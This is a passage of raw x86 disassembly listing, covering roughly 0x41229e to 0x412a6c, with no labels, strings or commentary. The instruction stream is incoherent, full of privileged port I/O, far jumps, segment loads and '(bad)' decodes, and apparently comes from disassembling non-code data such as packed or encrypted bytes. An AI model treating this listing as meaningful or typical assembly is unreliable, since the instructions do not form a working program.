  41229e:	jmp    0xa39ad7e0
  4122a3:	outs   dx,BYTE PTR ds:[esi]
  4122a4:	addr16 shl ecx,0x8a
  4122a8:	out    dx,al
  4122a9:	sbb    dh,BYTE PTR [edi+eax*4]
  4122ac:	shl    BYTE PTR [eax+edi*8],0x7c
  4122b0:	xchg   edi,eax
  4122b1:	mov    edx,DWORD PTR [ebp+0x42]
  4122b4:	jo     0x412245
  4122b6:	jmp    0xf9d65747
  4122bb:	into   
  4122bc:	out    dx,eax
  4122bd:	mov    cl,0xe7
  4122bf:	xchg   edi,eax
  4122c0:	aaa    
  4122c1:	pop    edi
  4122c2:	adc    BYTE PTR [ebx+0x59],ch
  4122c5:	push   ebx
  4122c6:	cmp    DWORD PTR [ebx],edi
  4122c8:	jbe    0x412319
  4122ca:	cmp    eax,0x3b914859
  4122cf:	push   edx
  4122d0:	dec    eax
  4122d1:	std    
  4122d2:	jne    0x4122df
  4122d4:	dec    esp
  4122d5:	clc    
  4122d6:	pop    ss
  4122d7:	cdq    
  4122d8:	std    
  4122d9:	jae    0x41234d
  4122db:	inc    ecx
  4122dc:	or     al,0x96
  4122de:	mov    dh,0x15
  4122e0:	inc    ecx
  4122e1:	mov    bl,0x87
  4122e3:	mov    al,ds:0x34ced3d1
  4122e8:	mov    es,WORD PTR [ebx-0x26]
  4122eb:	mov    bh,BYTE PTR ds:0x6a1e7cbd
  4122f1:	clc    
  4122f2:	and    al,0xbb
  4122f4:	cmp    esp,edi
  4122f6:	jns    0x412348
  4122f8:	test   al,0x95
  4122fa:	arpl   WORD PTR [ecx+0x13],di
  4122fd:	sbb    al,0x67
  4122ff:	add    eax,0xf4290fee
  412304:	pop    DWORD PTR [ecx-0xd]
  412307:	imul   BYTE PTR [ecx+eiz*8]
  41230a:	jp     0x4122b2
  41230c:	adc    BYTE PTR [edx+0x5c596353],ch
  412312:	fiadd  WORD PTR [edi]
  412314:	xchg   edx,eax
  412315:	xchg   edx,eax
  412316:	out    dx,al
  412317:	dec    ecx
  412318:	cwde   
  412319:	test   BYTE PTR [edx+eiz*2+0x46],dl
  41231d:	adc    DWORD PTR [esi+eiz*8],esi
  412320:	lods   eax,DWORD PTR ds:[esi]
  412321:	cmp    ebp,DWORD PTR [ecx]
  412323:	xor    edi,DWORD PTR [edi]
  412325:	adc    eax,0x7bd78f80
  41232a:	fist   DWORD PTR [eax-0x3c]
  41232d:	jbe    0x41236c
  41232f:	call   0x3987:0xe91ad1dc
  412336:	or     BYTE PTR [edx],cl
  412338:	test   BYTE PTR ds:0x62c9da8f,bl
  41233e:	jbe    0x41237b
  412340:	sbb    cl,dh
  412342:	push   0x1ea05521
  412347:	dec    ebp
  412348:	sar    DWORD PTR [edi+0x54c4433f],cl
  41234e:	jmp    0xb23f330
  412353:	add    ah,BYTE PTR [eax]
  412355:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412356:	aad    0x86
  412358:	sub    eax,0xf3ec68cc
  41235d:	and    BYTE PTR [ecx-0x7d3f7091],bl
  412363:	xor    ebx,DWORD PTR [ecx-0x2ebe628e]
  412369:	pushf  
  41236a:	cmp    eax,0x57adfa54
  41236f:	xchg   ecx,eax
  412370:	mov    dl,0x9f
  412372:	xor    ch,BYTE PTR [ecx+0x56]
  412375:	call   0x14892bcd
  41237a:	cmp    al,0xfe
  41237c:	and    DWORD PTR [eax+ebp*2+0x23c5abdd],edx
  412383:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  412385:	aas    
  412386:	add    DWORD PTR [edx+0x48],edx
  412389:	adc    DWORD PTR [ebx-0x5c],ecx
  41238c:	lods   al,BYTE PTR ds:[esi]
  41238d:	pop    edx
  41238e:	sub    al,0xf4
  412390:	add    ecx,ebp
  412392:	pushf  
  412393:	jge    0x41238b
  412395:	dec    bp
  412397:	mov    al,ds:0xf2b72917
  41239c:	mov    esi,0xf4780a1d
  4123a1:	cmp    dh,0xc5
  4123a4:	inc    esp
  4123a5:	fcomi  st,st(1)
  4123a7:	cmp    al,0xb4
  4123a9:	fs jl  0x4123d2
  4123ac:	jne    0x4123ea
  4123ae:	add    al,0x3b
  4123b0:	mov    eax,ds:0x92018d15
  4123b5:	loopne 0x412423
  4123b7:	fsubr  DWORD PTR ds:0x6f15a6c1
  4123bd:	sahf   
  4123be:	mov    ebx,0x62861b81
  4123c3:	and    cl,cl
  4123c5:	mov    bl,0x15
  4123c7:	push   edi
  4123c8:	in     al,dx
  4123c9:	add    esp,DWORD PTR [ecx+0x49]
  4123cc:	cmp    eax,0x5762def5
  4123d1:	pop    ds
  4123d2:	sar    DWORD PTR [ebp-0x2f],1
  4123d5:	cmp    al,0x17
  4123d7:	adc    dl,BYTE PTR [ebx+0x6a]
  4123da:	inc    eax
  4123db:	dec    eax
  4123dc:	loopne 0x4123e5
  4123de:	aaa    
  4123df:	xchg   ebx,eax
  4123e0:	jne    0x412376
  4123e2:	cmp    DWORD PTR [ebp+0x51353a01],0x9b38926a
  4123ec:	mov    ch,0xc1
  4123ee:	cs add al,0x62
  4123f1:	outs   dx,BYTE PTR ds:[esi]
  4123f2:	pop    edx
  4123f3:	sub    al,BYTE PTR [edx+0x42e68fae]
  4123f9:	std    
  4123fa:	dec    ebp
  4123fb:	jmp    0x41247c
  4123fd:	mov    al,dh
  4123ff:	sub    edx,ecx
  412401:	sub    bh,0x9b
  412404:	mov    edx,0x510f5278
  412409:	and    dl,BYTE PTR [eax+edx*8+0x5fad6757]
  412410:	xchg   BYTE PTR [ecx],bh
  412412:	push   0xffffff82
  412414:	mov    BYTE PTR [eax+0x7ffd53f9],dl
  41241a:	cwde   
  41241b:	shl    BYTE PTR [eax-0x5420bac3],0x7e
  412422:	xchg   BYTE PTR [edx-0x55],dh
  412425:	or     edi,DWORD PTR [ebx]
  412427:	or     edx,edi
  412429:	aaa    
  41242a:	pusha  
  41242b:	push   edx
  41242c:	jl     0x412489
  41242e:	lods   eax,DWORD PTR ds:[esi]
  41242f:	pop    esp
  412430:	cmp    esp,DWORD PTR [ebp+edx*2-0x33]
  412434:	mov    gs,WORD PTR [edx]
  412436:	test   al,0x68
  412438:	xor    esp,DWORD PTR [ebp-0x7c09e3c4]
  41243e:	lea    esp,[esi]
  412440:	fbstp  TBYTE PTR [edx+0x49a612fb]
  412446:	mov    ds:0x9a126b20,eax
  41244b:	call   0x267d7c52
  412450:	sbb    esi,DWORD PTR [ecx]
  412452:	out    0x27,al
  412454:	inc    ebx
  412455:	adc    bl,BYTE PTR [edi]
  412457:	fsub   QWORD PTR [ecx+0x72]
  41245a:	or     dh,bl
  41245c:	inc    edi
  41245d:	popf   
  41245e:	sar    ebp,cl
  412460:	in     al,dx
  412461:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412462:	outs   dx,BYTE PTR ds:[esi]
  412463:	xlat   BYTE PTR ds:[ebx]
  412464:	or     BYTE PTR [ecx-0xa],bh
  412467:	sti    
  412468:	fwait
  412469:	push   ss
  41246a:	jb     0x412462
  41246c:	push   edx
  41246d:	leave  
  41246e:	cmp    eax,0x606a8f35
  412473:	jle    0x412435
  412475:	ja     0x41241b
  412477:	xchg   esp,eax
  412478:	and    al,0x67
  41247a:	mov    bh,0xa6
  41247c:	loop   0x412404
  41247e:	imul   ecx,ebp,0xb
  412481:	out    dx,al
  412482:	(bad)  
  412483:	scas   al,BYTE PTR es:[edi]
  412484:	hlt    
  412485:	aam    0xc5
  412487:	xchg   ecx,eax
  412488:	pop    ds
  412489:	cmp    ebp,DWORD PTR [esi-0x4c]
  41248c:	ss or  dl,dl
  41248f:	outs   dx,DWORD PTR ds:[esi]
  412490:	push   esp
  412491:	xchg   esp,eax
  412492:	or     eax,0x8bcb3ce8
  412497:	jl     0x4124fd
  412499:	loop   0x4124aa
  41249b:	mov    cl,0x5d
  41249d:	xor    edi,ecx
  41249f:	leave  
  4124a0:	(bad)  
  4124a1:	jmp    0x412512
  4124a3:	push   ds
  4124a4:	xor    dl,bh
  4124a6:	xorps  xmm1,XMMWORD PTR [edi+0x30]
  4124aa:	fsub   QWORD PTR [esi-0x64]
  4124ad:	mov    ah,0x6d
  4124af:	or     edi,DWORD PTR [ebx-0x79]
  4124b2:	int3   
  4124b3:	xchg   esp,eax
  4124b4:	jecxz  0x4124e5
  4124b6:	cdq    
  4124b7:	jge    0x41244f
  4124b9:	push   0xffffffaa
  4124bb:	fld    DWORD PTR gs:[edx-0x56]
  4124bf:	call   0x4b2e:0x3532cce5
  4124c6:	fcom   QWORD PTR [ebx-0x1c]
  4124c9:	xchg   BYTE PTR [ebp+0x46fd5ebf],dl
  4124cf:	rol    DWORD PTR [ecx-0x69a53dde],1
  4124d5:	fisub  WORD PTR [ebp-0x51]
  4124d8:	pusha  
  4124d9:	add    BYTE PTR [ebp+0x7b2a8ee5],al
  4124df:	lock lock sbb esp,DWORD PTR [eax-0x34bff022]
  4124e7:	ds jge 0x4124b3
  4124ea:	mov    BYTE PTR [edx+0x7f96df03],ah
  4124f0:	sti    
  4124f1:	cmp    eax,0xd9775cf1
  4124f6:	nop
  4124f7:	xchg   ebx,eax
  4124f8:	jae    0x412530
  4124fa:	push   ss
  4124fb:	xchg   edi,eax
  4124fc:	jmp    0x4124ed
  4124fe:	loope  0x412556
  412500:	jne    0x41254e
  412502:	in     eax,0x84
  412504:	or     al,0xe6
  412506:	inc    edi
  412507:	xor    BYTE PTR cs:[ebx+0x1bbf3128],0xd2
  41250f:	add    eax,DWORD PTR [eax+0x62]
  412512:	pop    esp
  412513:	aad    0xf6
  412515:	stc    
  412516:	jg     0x4124f1
  412518:	lea    edx,[edi]
  41251a:	cmp    ah,BYTE PTR [ecx+0x1d]
  41251d:	pop    ecx
  41251e:	push   edx
  41251f:	fdiv   DWORD PTR [eax-0x2d2a150f]
  412525:	cwde   
  412526:	ret    
  412527:	cmp    bl,BYTE PTR [ecx+0x2b]
  41252a:	dec    ebx
  41252b:	leave  
  41252c:	or     al,0xa
  41252e:	cmp    bl,BYTE PTR ds:0xfe0262b2
  412534:	xchg   ebx,eax
  412535:	cmp    al,0x2e
  412537:	mov    ds,WORD PTR [ecx]
  412539:	jns    0x4124d2
  41253b:	repz push eax
  41253d:	inc    DWORD PTR [ecx+0x1ddb49a9]
  412543:	ret    
  412544:	mov    bl,0x64
  412546:	test   BYTE PTR [edx-0x23acac26],dh
  41254c:	mov    ah,ah
  41254e:	(bad)  
  41254f:	xchg   edi,eax
  412550:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412551:	aam    0x1
  412553:	jne    0x412501
  412555:	push   ds
  412556:	(bad)  
  412557:	jmp    0x412569
  412559:	adc    DWORD PTR [ebx*4-0x3b0968ce],edx
  412560:	outs   dx,DWORD PTR ds:[esi]
  412561:	pop    ecx
  412562:	mov    ch,BYTE PTR [esi+0x78]
  412565:	mov    esp,0x19722950
  41256a:	adc    esp,edx
  41256c:	sbb    bh,dl
  41256e:	ins    DWORD PTR es:[edi],dx
  41256f:	inc    ebx
  412570:	clc    
  412571:	ins    DWORD PTR es:[edi],dx
  412572:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412573:	sub    eax,0x9123a5d2
  412578:	lea    esp,[ebp-0x2a07c9c]
  41257e:	sub    al,0x23
  412580:	push   ebp
  412581:	stos   BYTE PTR es:[edi],al
  412582:	(bad)  
  412584:	mov    esi,0x3f65e007
  412589:	lahf   
  41258a:	inc    ecx
  41258b:	sbb    BYTE PTR [edx-0x52],bl
  41258e:	data16 jp 0x412577
  412591:	hlt    
  412592:	jnp    0x4125c5
  412594:	pop    ebx
  412595:	dec    esp
  412596:	cdq    
  412597:	popf   
  412598:	cmp    bh,dh
  41259a:	das    
  41259b:	mov    ecx,0xe1583e72
  4125a0:	mov    ebx,0x5c2f2f82
  4125a5:	and    ch,BYTE PTR [eax+0x4c]
  4125a8:	sub    esp,ebp
  4125aa:	lock aam 0x2
  4125ad:	mul    DWORD PTR [ebx-0x6fd5e4d8]
  4125b3:	pop    ebx
  4125b4:	mov    ebp,0xafa8cc92
  4125b9:	push   esi
  4125ba:	int3   
  4125bb:	push   ss
  4125bc:	into   
  4125bd:	daa    
  4125be:	retf   
  4125bf:	or     cl,cl
  4125c1:	gs mov ds,ecx
  4125c4:	push   esi
  4125c5:	mov    ecx,0xf97c940c
  4125ca:	shl    BYTE PTR [ecx],cl
  4125cc:	addr16 leave 
  4125ce:	mov    eax,0x9dee4d6e
  4125d3:	mov    ebx,0xb9e0e7e0
  4125d8:	jmp    0x412618
  4125da:	das    
  4125db:	int    0xfc
  4125dd:	inc    esp
  4125de:	or     eax,0x95c7b34e
  4125e3:	mov    dh,0xd3
  4125e5:	lock xor eax,0x3712e404
  4125eb:	in     eax,0x3e
  4125ed:	pop    eax
  4125ee:	mul    DWORD PTR [ebp+0x6d1091f]
  4125f4:	fcmovnu st,st(7)
  4125f6:	ja     0x412650
  4125f8:	rcr    BYTE PTR ds:0x7ec3742b,cl
  4125fe:	add    ch,ah
  412600:	ror    cl,1
  412602:	cmc    
  412603:	pop    es
  412604:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412605:	jg     0x4125cd
  412607:	outs   dx,BYTE PTR ds:[esi]
  412608:	nop
  412609:	fdivr  QWORD PTR [esi-0x4fed257f]
  41260f:	lock aaa 
  412611:	out    dx,eax
  412612:	or     eax,DWORD PTR [ebx+0x39]
  412615:	push   0xd
  412617:	sub    edx,edx
  412619:	xchg   esi,eax
  41261a:	jge    0x412618
  41261c:	xchg   BYTE PTR [edx],dh
  41261e:	or     ch,cl
  412620:	pop    ss
  412621:	je     0x412672
  412623:	in     eax,dx
  412624:	inc    ecx
  412625:	jmp    0x4125ff
  412627:	aam    0x8c
  412629:	ss push ebx
  41262b:	mov    ds:0x5356e2b5,al
  412630:	hlt    
  412631:	scas   eax,DWORD PTR es:[edi]
  412632:	sbb    al,0xe0
  412634:	mov    DWORD PTR [ecx+0x2db0f0ca],ebx
  41263a:	jns    0x412647
  41263c:	cs dec esi
  41263e:	sub    DWORD PTR [eax+edi*1+0x3c],edi
  412642:	into   
  412643:	ins    DWORD PTR es:[edi],dx
  412644:	jns    0x4125e6
  412646:	inc    ebx
  412647:	(bad)  
  412648:	sti    
  412649:	sbb    al,0x82
  41264b:	inc    edi
  41264c:	dec    ebx
  41264d:	mov    ah,0x8c
  41264f:	mov    ds:0xfbd05b5d,eax
  412654:	xchg   ebp,eax
  412655:	cld    
  412656:	xchg   ebx,eax
  412657:	test   BYTE PTR [eax-0x8],ch
  41265a:	xchg   ebx,eax
  41265b:	test   al,0x9a
  41265d:	imul   edx,esp,0xffffff8c
  412660:	xchg   BYTE PTR [eax-0x23],bl
  412663:	jae    0x79c885c7
  412669:	xor    eax,0xf3a3bc26
  41266e:	or     bh,dl
  412670:	jbe    0x412651
  412672:	push   cs
  412673:	sti    
  412674:	push   edi
  412675:	adc    eax,0xc46dea81
  41267a:	cmp    eax,0xfa85fd17
  41267f:	nop
  412680:	ret    
  412681:	mov    al,0x41
  412683:	data16 fbld TBYTE PTR [edx]
  412686:	push   ebx
  412687:	adc    ecx,ebx
  412689:	jge    0x4126ee
  41268b:	xchg   esp,eax
  41268c:	loopne 0x412680
  41268e:	jle    0x41262b
  412690:	pop    ebx
  412691:	stos   BYTE PTR es:[edi],al
  412692:	stos   BYTE PTR es:[edi],al
  412693:	mov    dh,0x38
  412695:	adc    al,0x67
  412697:	inc    eax
  412698:	retf   0x31b
  41269b:	jg     0x412704
  41269d:	(bad)  
  41269e:	fild   QWORD PTR [ecx]
  4126a0:	aas    
  4126a1:	dec    eax
  4126a2:	mov    eax,ds:0x80d62b76
  4126a7:	push   edx
  4126a8:	int    0x4a
  4126aa:	call   DWORD PTR [edx]
  4126ac:	jmp    0x78fd:0xb7a57b76
  4126b3:	mov    dl,0xf5
  4126b5:	fsub   QWORD PTR [ebx+0x1b726e1f]
  4126bb:	aaa    
  4126bc:	mov    bh,0x83
  4126be:	test   BYTE PTR [ecx-0x1c8d4a8f],dh
  4126c4:	jne    0x41266d
  4126c6:	cmp    BYTE PTR [eax],ah
  4126c8:	ins    DWORD PTR es:[edi],dx
  4126c9:	jp     0x412720
  4126cb:	in     eax,dx
  4126cc:	or     DWORD PTR [edx-0x73],ecx
  4126cf:	in     al,dx
  4126d0:	inc    eax
  4126d1:	fbld   TBYTE PTR [edi]
  4126d3:	xor    BYTE PTR [edi+0x22701f07],0xfe
  4126da:	mov    esp,0x559fd458
  4126df:	fcomp  DWORD PTR [ecx-0x7e]
  4126e2:	add    bh,BYTE PTR [ecx+eiz*8-0x6f]
  4126e6:	add    BYTE PTR [edi+ecx*8-0xed954a5],cl
  4126ed:	lahf   
  4126ee:	in     al,0xe1
  4126f0:	dec    edi
  4126f1:	aam    0xa8
  4126f3:	sub    edx,DWORD PTR [edi-0x3db35519]
  4126f9:	push   0x370aa3db
  4126fe:	pcmpeqb mm5,QWORD PTR [edx+esi*8-0x7b]
  412703:	pushf  
  412704:	mov    dh,0xff
  412706:	lea    ebx,[esp+eax*4]
  412709:	jbe    0x412701
  41270b:	jl     0x4126e7
  41270d:	add    DWORD PTR [ebx+eiz*2+0x6c13b862],edx
  412714:	sahf   
  412715:	outs   dx,DWORD PTR ds:[esi]
  412716:	nop
  412717:	sub    al,0xf2
  412719:	mov    dh,0x3d
  41271b:	pop    esp
  41271c:	push   0x37
  41271e:	mov    ebx,ebx
  412720:	daa    
  412721:	call   FWORD PTR [ecx+eax*2-0xf]
  412725:	cwde   
  412726:	out    dx,al
  412727:	scas   al,BYTE PTR es:[di]
  412729:	adc    dl,bl
  41272b:	ds daa 
  41272d:	inc    ebp
  41272e:	push   es
  41272f:	lds    esi,FWORD PTR [edi]
  412731:	mov    al,ds:0x57f1d861
  412736:	xor    eax,0xf50b0910
  41273b:	add    eax,0x1855d887
  412740:	xchg   ecx,eax
  412741:	test   BYTE PTR ds:0xc5e0d1cd,ch
  412747:	int3   
  412748:	fwait
  412749:	hlt    
  41274a:	mov    edx,0x93a2ba1
  41274f:	pop    ecx
  412750:	xor    edx,0xffffff8b
  412753:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412754:	and    al,0x6c
  412756:	aam    0xd
  412758:	adc    eax,0xddcf3dce
  41275d:	sbb    ch,BYTE PTR [edx]
  41275f:	imul   ecx,DWORD PTR [ebp-0x35],0x32
  412763:	pop    ds
  412764:	or     bl,BYTE PTR [edi-0x77f601db]
  41276a:	dec    ebp
  41276b:	xchg   edi,eax
  41276c:	lock aaa 
  41276e:	pusha  
  41276f:	into   
  412770:	inc    ecx
  412771:	retf   0xc13c
  412774:	add    DWORD PTR [ebp+0x6c],eax
  412777:	push   ecx
  412778:	xor    edi,DWORD PTR [edi-0x755bec51]
  41277e:	mov    esi,0x42ac7539
  412783:	dec    esp
  412784:	mov    ebp,0xe9d96192
  412789:	adc    bl,al
  41278b:	addr16 fcom st(3)
  41278e:	cmp    eax,0x996e0a9b
  412793:	jmp    0x8872678c
  412798:	xchg   edx,eax
  412799:	div    DWORD PTR [ecx]
  41279b:	xor    BYTE PTR [eax-0x70],0x52
  41279f:	jne    0x4127b4
  4127a1:	bound  edi,QWORD PTR [esi+0xc]
  4127a4:	sbb    al,0x85
  4127a6:	pop    es
  4127a7:	dec    esi
  4127a8:	sub    al,0xbd
  4127aa:	push   edx
  4127ab:	shl    DWORD PTR [ecx+0x25],cl
  4127ae:	adc    eax,0x8a4349b3
  4127b3:	div    BYTE PTR [eax]
  4127b5:	sbb    al,0x3f
  4127b7:	aam    0x66
  4127b9:	add    bl,dh
  4127bb:	sbb    ebx,DWORD PTR [ebp+0x51bcdf14]
  4127c1:	fwait
  4127c2:	shl    DWORD PTR [edx+0x374f654f],cl
  4127c8:	(bad)  
  4127c9:	xor    eax,0x9dcfd1d4
  4127ce:	xor    eax,0xa891ae2f
  4127d3:	mov    al,ds:0x6ac2a69a
  4127d8:	mov    ecx,0xd148a91a
  4127dd:	aad    0xe8
  4127df:	or     DWORD PTR ds:0x44d480ea,edi
  4127e5:	add    eax,0x48caabcb
  4127ea:	mov    ebx,0x361aa7c6
  4127ef:	jp     0x4127ab
  4127f1:	fldenv [ebx+0x49]
  4127f4:	(bad)  
  4127f5:	aaa    
  4127f6:	push   es
  4127f7:	push   ebp
  4127f8:	jbe    0x412805
  4127fa:	cmp    eax,edi
  4127fc:	inc    edi
  4127fd:	leave  
  4127fe:	push   edi
  4127ff:	mov    esp,0x80b4a3c4
  412804:	mov    ebp,eax
  412806:	lods   al,BYTE PTR ds:[esi]
  412807:	ss push cs
  412809:	push   ebx
  41280a:	jp     0x412868
  41280c:	cli    
  41280d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41280e:	xchg   BYTE PTR [eax+0x3c5786c2],ch
  412814:	mov    ecx,0x68ce4d50
  412819:	popf   
  41281a:	adc    al,0x2e
  41281c:	aad    0x34
  41281e:	push   es
  41281f:	gs jno 0x412827
  412822:	jnp    0x412881
  412824:	loope  0x412874
  412826:	retf   0xd2f
  412829:	jo     0x4127f9
  41282b:	mov    eax,0x555d3e01
  412830:	add    BYTE PTR [edx+0x3ead5cfc],0xea
  412837:	mov    al,ds:0xdc8873b
  41283c:	lds    edx,FWORD PTR [eax*1+0x5bcbc85]
  412843:	cmp    DWORD PTR [edx+edx*8],0x72
  412847:	in     al,0x48
  412849:	imul   eax,DWORD PTR [ebp-0x2b29c952],0xef395d47
  412853:	cli    
  412854:	ins    BYTE PTR es:[edi],dx
  412855:	jmp    0x6f69:0xfb950dc3
  41285c:	cwde   
  41285d:	(bad)  
  41285e:	aam    0xe1
  412860:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412861:	adc    al,0x53
  412863:	jle    0x412816
  412865:	sub    esp,DWORD PTR [esi-0x8]
  412868:	mov    eax,ds:0x62b2f99
  41286d:	mov    ds:0x409ed343,eax
  412872:	ss add eax,edx
  412875:	xor    eax,0xfc927b92
  41287a:	scas   al,BYTE PTR es:[edi]
  41287b:	ds gs loopne 0x4128cb
  41287f:	push   eax
  412880:	xor    BYTE PTR [ecx+0x13],ch
  412883:	mov    al,cs:0x1d957e43
  412889:	xchg   esi,eax
  41288a:	pop    ss
  41288b:	dec    esi
  41288c:	lahf   
  41288d:	push   ds
  41288e:	loope  0x41289b
  412890:	fsubr  DWORD PTR [esi+0x3eae1f6e]
  412896:	mov    bl,ah
  412898:	cld    
  412899:	mov    ecx,0xe1454783
  41289e:	mov    al,0x8b
  4128a0:	and    DWORD PTR [ebp+0x20],esp
  4128a3:	(bad)  [ebx-0x4d]
  4128a6:	mov    dh,0xfb
  4128a8:	or     DWORD PTR [ebx],edi
  4128aa:	sub    BYTE PTR [eax-0x338a5095],0xaf
  4128b1:	push   ds
  4128b2:	sub    eax,0x3615af82
  4128b7:	mov    WORD PTR [edx-0x1],?
  4128ba:	or     esp,DWORD PTR [ebx+esi*2-0x7c53b75c]
  4128c1:	arpl   WORD PTR [edx-0x4e],si
  4128c4:	jle    0x4128db
  4128c6:	inc    eax
  4128c7:	jno    0x41291f
  4128c9:	xchg   ebx,eax
  4128ca:	dec    BYTE PTR [edx-0x75]
  4128cd:	sti    
  4128ce:	mov    al,0xa2
  4128d0:	in     al,dx
  4128d1:	loope  0x412936
  4128d3:	les    esi,FWORD PTR [edi-0x2a]
  4128d6:	xor    eax,0x43486c2
  4128db:	in     eax,dx
  4128dc:	adc    BYTE PTR [edi],0x79
  4128df:	sbb    ecx,ecx
  4128e1:	hlt    
  4128e2:	lea    ebx,[edi-0x68]
  4128e5:	stos   DWORD PTR es:[edi],eax
  4128e6:	adc    eax,0x1927901
  4128eb:	test   eax,0xa09015f
  4128f0:	scas   eax,DWORD PTR es:[edi]
  4128f1:	pop    ecx
  4128f2:	mov    bl,0x7e
  4128f4:	sbb    eax,0x25cdd8f7
  4128f9:	outs   dx,DWORD PTR ds:[esi]
  4128fa:	jecxz  0x4128d8
  4128fc:	mov    edx,0x98b78a05
  412901:	inc    edi
  412902:	aaa    
  412903:	mov    eax,0x5d76b82
  412908:	xchg   edi,eax
  412909:	clc    
  41290a:	cwde   
  41290b:	into   
  41290c:	mov    edi,0xf68ed3af
  412911:	mov    ds:0x8be2e0fe,eax
  412916:	jmp    0xcd0a56d7
  41291b:	nop
  41291c:	push   0x2c
  41291e:	and    dl,al
  412920:	icebp  
  412921:	addr16 add al,0x72
  412924:	test   eax,0x7597c4ef
  412929:	cld    
  41292a:	(bad)  
  41292b:	lds    edx,FWORD PTR [ecx]
  41292d:	sbb    ebp,DWORD PTR [ecx+eax*4+0x69]
  412931:	push   eax
  412932:	mov    dl,0xd0
  412934:	pop    edx
  412935:	lds    eax,FWORD PTR [edi-0x19ea23c]
  41293b:	adc    edi,esi
  41293d:	ins    BYTE PTR es:[edi],dx
  41293e:	cs repz sub eax,0xda43963
  412945:	mov    al,0xe6
  412947:	pop    es
  412948:	inc    ebp
  412949:	pop    ebx
  41294a:	inc    ecx
  41294b:	shl    DWORD PTR [edi],1
  41294d:	inc    ecx
  41294e:	je     0x4129b2
  412950:	xchg   edi,eax
  412951:	xchg   edi,eax
  412952:	sub    ebp,DWORD PTR [ecx]
  412954:	push   esp
  412955:	and    cl,cl
  412957:	push   es
  412958:	stc    
  412959:	dec    esp
  41295a:	imul   esi,DWORD PTR [edx+0x79c02f1a],0xffffff98
  412961:	dec    ebx
  412962:	jmp    0xad370d2
  412967:	loope  0x412946
  412969:	aas    
  41296a:	jge    0x412970
  41296c:	push   ds
  41296d:	jb     0x41291d
  41296f:	rcl    DWORD PTR [ecx],0x2f
  412972:	cmc    
  412973:	ficomp WORD PTR [ebp+0x1]
  412976:	out    0xe8,eax
  412978:	cs aaa 
  41297a:	jmp    0xed034af0
  41297f:	xchg   ecx,eax
  412980:	pop    ss
  412981:	xor    bl,bl
  412983:	stc    
  412984:	inc    ecx
  412985:	pop    es
  412986:	(bad)  
  412987:	mov    al,0x82
  412989:	push   eax
  41298a:	fcmovne st,st(2)
  41298c:	call   FWORD PTR [esi]
  41298e:	xlat   BYTE PTR ds:[ebx]
  41298f:	or     bh,bh
  412991:	jl     0x41297b
  412993:	cld    
  412994:	sbb    dh,BYTE PTR [ecx-0x7e]
  412997:	inc    esi
  412998:	adc    BYTE PTR [eax],dl
  41299a:	dec    edx
  41299b:	test   eax,0xd7af57ab
  4129a0:	mov    edx,0x52937340
  4129a5:	push   ss
  4129a6:	adc    eax,0x3fdcec63
  4129ab:	dec    ebx
  4129ac:	pushf  
  4129ad:	mov    ds:0xdb0c0392,al
  4129b2:	cmc    
  4129b3:	(bad)
  4129b6:	mov    al,0x21
  4129b8:	adc    eax,0x921cabae
  4129bd:	or     eax,0x4487287
  4129c2:	push   ss
  4129c3:	je     0x4129bb
  4129c5:	push   esp
  4129c6:	nop
  4129c7:	jmp    0x4129e8
  4129c9:	gs cld 
  4129cb:	mov    ah,0xa1
  4129cd:	addr16 out dx,al
  4129cf:	xchg   esp,eax
  4129d0:	push   es
  4129d1:	jno    0x4129cb
  4129d3:	lahf   
  4129d4:	imul   esp,DWORD PTR [ebx],0x5e2bc41c
  4129da:	push   0xffffffae
  4129dc:	mov    esi,0xfa22901
  4129e1:	add    BYTE PTR [esi],cl
  4129e3:	push   ss
  4129e4:	mov    eax,ds:0xd162a4a6
  4129e9:	scas   al,BYTE PTR es:[edi]
  4129ea:	sbb    BYTE PTR [ecx],bh
  4129ec:	pop    ecx
  4129ed:	retf   
  4129ee:	adc    DWORD PTR [edi],ebx
  4129f0:	mov    cl,0x7c
  4129f2:	lods   eax,DWORD PTR ds:[esi]
  4129f3:	les    eax,FWORD PTR [edx+edi*2+0xa609b8c]
  4129fa:	cli    
  4129fb:	daa    
  4129fc:	repz xchg ebp,eax
  4129fe:	scas   al,BYTE PTR es:[edi]
  4129ff:	add    eax,0x299f5068
  412a04:	nop
  412a05:	or     eax,0x1ad2bdf
  412a0a:	stc    
  412a0b:	dec    eax
  412a0c:	sub    BYTE PTR [edi],bh
  412a0e:	xlat   BYTE PTR ds:[ebx]
  412a0f:	mov    edx,0x391657c7
  412a14:	call   0x1b59:0x7cbd6049
  412a1b:	xchg   ecx,eax
  412a1c:	stc    
  412a1d:	dec    ebp
  412a1e:	sub    eax,0x41d861fb
  412a23:	push   es
  412a24:	es cmc 
  412a26:	xchg   edi,eax
  412a27:	in     eax,0xac
  412a29:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412a2a:	cwde   
  412a2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412a2c:	retf   0x7efe
  412a2f:	(bad)  
  412a30:	(bad)  
  412a31:	dec    ebx
  412a32:	sub    BYTE PTR [eax],dl
  412a34:	daa    
  412a35:	les    eax,FWORD PTR [edi-0x16ec998b]
  412a3b:	lods   al,BYTE PTR ds:[esi]
  412a3c:	je     0x412a47
  412a3e:	xor    BYTE PTR ds:[ebx+0x4],dh
  412a42:	scas   al,BYTE PTR es:[edi]
  412a43:	mov    cl,0xb2
  412a45:	push   ebp
  412a46:	pop    esp
  412a47:	in     al,dx
  412a48:	in     al,0xa3
  412a4a:	dec    eax
  412a4b:	outs   dx,BYTE PTR ds:[esi]
  412a4c:	cmp    DWORD PTR [edx+0x29],eax
  412a4f:	pop    ss
  412a50:	(bad)
  412a53:	into   
  412a54:	xchg   BYTE PTR [esi-0x64],bl
  412a57:	lahf   
  412a58:	icebp  
  412a59:	cdq    
  412a5a:	adc    DWORD PTR [edi-0x4],0xffffffaf
  412a5e:	xchg   edx,eax
  412a5f:	and    BYTE PTR [edi-0x4ad9a42a],0x56
  412a66:	ss sub bl,dh
  412a69:	repnz sub al,0x99
  412a6c:	repz pop ss
